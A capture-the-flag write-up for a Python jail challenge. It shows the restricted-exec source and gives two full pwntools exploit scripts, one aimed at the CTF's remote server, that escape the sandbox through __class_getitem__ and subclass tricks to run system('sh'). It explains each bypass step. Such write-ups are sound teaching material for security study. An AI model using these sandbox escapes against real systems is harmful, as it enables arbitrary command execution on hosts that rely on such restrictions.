# TCP1P CTF 2024 typically not a revenge

```python
#!/usr/bin/env python3
code = '''
import sys
import posix

__builtins__ = sys._getframe(0).f_builtins

for _ in unsafe_builtins:
    del __builtins__[_]
unsafe_builtins.clear()

posix.__dict__.clear()
sys.modules.clear()
for _ in sys.__dict__:
    sys.__dict__[_] = None

del sys, posix
'''

unsafe_builtins = []
unsafe_chars = 'FT!"#$%&\'()*+-,/;<=>?@\\^`{|}~0123456789\t\n\v '

for _ in __builtins__.__dict__:
    if not isinstance(__builtins__.__dict__[_], type):
        unsafe_builtins.append(_)
    elif _.startswith('_'):
        unsafe_builtins.append(_)
    elif _[0].islower():
        unsafe_builtins.append(_)

user_input = input('Enter code: ').strip()
for c in set(user_input):
    if c in unsafe_chars:
        assert 0, 'Unsafe character detected!'

assert len(user_input.split('\r')) < 3
assert user_input.isascii()
exec(code + user_input, {'unsafe_builtins': unsafe_builtins}, {})
```

Requirements:

1. No numbers: Use `arr[[]is[]]` for `arr[0]`, `arr[not[]is[]]` for `arr[1]`, `arr[not[]is[]:][not[]is[]]` for `arr[2]`
2. No parens: Use `[class[arg] for class.__class_getitem__ in [function_to_call]]` to call function
3. No assignments or commas: Use `[... for a in [b] for c in [d]]`
4. No spaces: Use `\f` i.e. form feed
5. No builtins: Use `[].__class__.__base__.__subclasses__()`
6. No sys module: Use `<class 'os._wrap_close'>` to find system

Inspired by writeup by @ayapi on Discord, although we use the different attack route eventually:

```python
from pwn import *
import sys

def bool2index(n):
    if n == 0:
        return '[[]is[]]'
    elif n == 1:
        return '[not[]is[]]'
    elif n > 1:
        return ''.join('[not[]is[]:]' for x in range(n-1))+'[not[]is[]]'

payload = f'''
try:__loader__
except Exception as e:[[[[[[[[[[[[[[[[[[[[cls[sh] for cls.__class_getitem__ in [system]] for sh in [cls[h]]] for cls.__class_getitem__ in [s.__add__]] for system in [cls[cls].system]] for cls.__class_getitem__ in [cls.get_source.__globals__[k{bool2index(7)}].__loader__.create_module]] for cls.name in [cls[x]]] for cls.get_source.__globals__[k{bool2index(9)}].builtin_module_names in [[cls[x]]]] for cls.__class_getitem__ in[cls[i].__add__]] for cls.__class_getitem__ in[cls[s].__add__]] for cls.__class_getitem__ in [cls[o].__add__]] for cls.__class_getitem__ in [k{bool2index(2)}{bool2index(2)}.__add__]] for h in [k{bool2index(11)}{bool2index(4)}]] for o in [k{bool2index(1)}{bool2index(3)}]] for s in [k{bool2index(4)}{bool2index(2)}]] for i in [k{bool2index(5)}{bool2index(4)}]] for x in [k{bool2index(21)}{bool2index(10)}]] for k in [cls[cls.get_source.__globals__]]] for cls.__class_getitem__ in [list]] for list in [[].__class__]] for cls in [e.__traceback__.tb_frame.f_back.f_globals[e.name].__class__]]
'''.strip().replace('\n', '\r').replace(' ', '\f')

r = remote('ctf.tcp1p.team', 32771)
r.sendline(payload.encode())
r.interactive()
```

To call function, we need a mutable object to write to its `__class_getitem__`:

```python
for x in __builtins__.__dict__:
    try:
        __builtins__.__dict__[x].__class_getitem__ = print
        print(x)
    except:
        pass
```

Output:

```
__loader__
__spec__
ExceptionGroup
quit
exit
copyright
credits
license
help
```

Here `ExceptionGroup` is not a member of `unsafe_builtins`, so we can use it for function call.

Steps:

1. Call `[].__class__.__base__.__subclasses__()` via `ExceptionGroup.__class_getitem__`
2. Locate `<class '_sitebuiltins._Helper'>` and `<class 'os._wrap_close'>` in the subclasses using the array index mechanism of `[False]`, `[True]`, `[True:][True]` ...
3. Synthesize `"system"` and `"sh"` from `_sitebuiltins._Helper.__doc__` via `"s".__add__("y").__add__("s").__add__("t").__add__("e").__add__("m")`
4. Find `system` in `<class 'os._wrap_close'>.__init__.__globals__["system"]`
5. Call `system("sh")`

Attach script:

```python
from pwn import *

context(log_level="debug")

subclasses = str(().__class__.__base__.__subclasses__())

# find the indices of the builtins
# assuming we are using the same Python version as remote

# assuming os_wrap_close is at 158
os_index = 158
assert subclasses.split(", ").index("<class 'os._wrap_close'>") == os_index
# assuming Helper is at 161
helper_index = 161
assert subclasses.split(", ").index("<class '_sitebuiltins._Helper'>") == helper_index

helper_doc = ().__class__.__base__.__subclasses__()[helper_index].__doc__


def get_index(index):
    # learn from @ayapi
    if index == 0:
        return "[[]is[]]"  # [False] i.e. [0]
    elif index == 1:
        return "[not[]is[]]"  # [True] i.e. [1]
    else:
        return (
            "".join(["[not[]is[]:]"] * (index - 1)) + "[not[]is[]]"
        )  # [True:][True:][True] i.e. [3]


p = process(["python3", "jail.py"])
p.sendline(
    (
        "[None "
        # [].__class__.__class__ = type
        # ExceptionGroup.__class_getitem__ = type.__subclasses__
        + "for ExceptionGroup.__class_getitem__ in [[].__class__.__class__.__subclasses__]"
        # locate helper: type.__subclasses__([].__class__.__base__))[helper_index]
        + f"for helper in [ExceptionGroup[[].__class__.__base__]{get_index(helper_index)}]"
        # locate os._wrap_close: type.__subclasses__([].__class__.__base__))[os_index]
        + f"for os in [ExceptionGroup[[].__class__.__base__]{get_index(os_index)}]"
        # read helper_doc
        + "for S in [helper.__doc__]"
        # prepare to synthesize "system" and "sh"
        + f"for s in [S{get_index(helper_doc.index("s"))}]"
        + f"for y in [S{get_index(helper_doc.index("y"))}]"
        + f"for t in [S{get_index(helper_doc.index("t"))}]"
        + f"for e in [S{get_index(helper_doc.index("e"))}]"
        + f"for m in [S{get_index(helper_doc.index("m"))}]"
        + f"for h in [S{get_index(helper_doc.index("h"))}]"
        # synthesize "system"
        + "for ExceptionGroup.__class_getitem__ in [s.__add__]"
        + f"for sy in [ExceptionGroup[y]]"
        + "for ExceptionGroup.__class_getitem__ in [sy.__add__]"
        + f"for sys in [ExceptionGroup[s]]"
        + "for ExceptionGroup.__class_getitem__ in [sys.__add__]"
        + f"for syst in [ExceptionGroup[t]]"
        + "for ExceptionGroup.__class_getitem__ in [syst.__add__]"
        + f"for syste in [ExceptionGroup[e]]"
        + "for ExceptionGroup.__class_getitem__ in [syste.__add__]"
        + f"for system in [ExceptionGroup[m]]"
        # synthesize "sh"
        + "for ExceptionGroup.__class_getitem__ in [s.__add__]"
        + f"for sh in [ExceptionGroup[h]]"
        # ExceptionGroup.__class_getitem__ = os.__init__.__globals__[system]
        + "for ExceptionGroup.__class_getitem__ in [os.__init__.__globals__[system]]"
        # call system("sh")
        + "for _ in [ExceptionGroup[sh]]"
        + "]"
    )
    .replace(" ", "\f")
    .encode()
)
p.interactive()
```

Here is the attack steps used in @ayapi's writeup on Discord:

1. Set `sys.builtin_module_names = ["posix"]`
2. Create `posix` module via `posix = builtins.__loader__.create_module([builtins.__spec__ for builtins.__spec__.name in ["posix"]][0])` (learned from [Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/))
3. Call `posix.system("sh")`

